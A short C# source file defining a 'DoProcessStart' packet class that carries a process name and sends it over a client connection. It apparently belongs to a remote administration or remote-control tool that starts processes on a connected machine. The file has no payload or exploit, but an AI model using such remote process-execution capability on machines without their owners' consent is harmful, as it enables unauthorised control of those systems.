using System;
using xLightClient.Core.Networking;

namespace xLightClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoProcessStart : IPacket
    {
        public string Processname { get; set; }

        public DoProcessStart()
        {
        }

        public DoProcessStart(string processname)
        {
            this.Processname = processname;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}